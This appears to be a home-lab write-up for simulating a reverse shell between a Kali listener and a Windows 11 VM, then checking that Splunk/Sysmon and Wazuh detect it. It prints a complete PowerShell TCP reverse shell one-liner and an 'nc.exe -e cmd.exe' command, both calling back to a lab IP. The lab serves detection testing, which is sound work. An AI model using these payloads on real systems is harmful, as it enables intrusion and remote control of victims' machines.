# Lab: Reverse Shell Simulation (T1059.003)

A reverse shell is a common technique where the compromised target system "calls back" to the attacker's machine, providing remote command execution while bypassing most inbound firewalls.

---

## 🛠️ Step 1: Set Up Listener (Kali Linux)

Open a terminal on your Kali machine and start a Netcat listener:

```bash
nc -lvnp 4444
```

---

## 🛠️ Step 2: Trigger the Shell (Windows 11 VM)

Try one of these methods to generate the connection:

### Method A: PowerShell One-Liner (Most common in modern attacks)
Open PowerShell and run:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.50.30", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### Method B: Netcat for Windows
If you have `nc.exe` on the target:
```cmd
nc.exe 192.168.50.30 4444 -e cmd.exe
```

---

## 🔍 Step 3: Verify Detection (SIEM)

1. **Splunk (Sysmon ID 3):** Look for an outbound network connection from `powershell.exe` to an unusual port (4444).
2. **Splunk (Sysmon ID 1):** Check for suspicious parent-child relationships (e.g., `cmd.exe` or `powershell.exe` spawned by a process with a network connection).
3. **Wazuh:** Look for active response alerts or "Suspicious process" rules triggering.

---

## 📸 Screenshots to Take
- Kali terminal showing the successful shell connection (`PS C:\Users\... >`)
- Splunk query showing the Event ID 3 network connection.
- Splunk query showing the Process Command Line.

Save as: `Screenshots/Attack_Simulations/Reverse_Shell_Connection.png`
